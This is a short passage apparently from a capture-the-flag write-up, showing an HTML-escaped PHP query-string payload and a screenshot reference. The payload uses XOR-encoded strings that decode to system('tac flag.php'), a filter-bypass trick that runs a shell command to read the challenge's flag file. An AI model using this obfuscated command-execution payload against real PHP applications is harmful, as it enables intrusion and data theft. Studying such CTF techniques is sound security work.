&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?v1=1&amp;amp;v3=1&amp;amp;v2=*(&amp;quot;%08%02%08%08%05%0d&amp;quot;^&amp;quot;%7b%7b%7b%7c%60%60&amp;quot;)(&amp;quot;%08%01%03%00%06%0c%01%07%00%0b%08%0b&amp;quot;^&amp;quot;%7c%60%60%20%60%60%60%60%2e%7b%60%7b&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250816191941451.png&#34; alt=&#34;image-20250816191941451&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
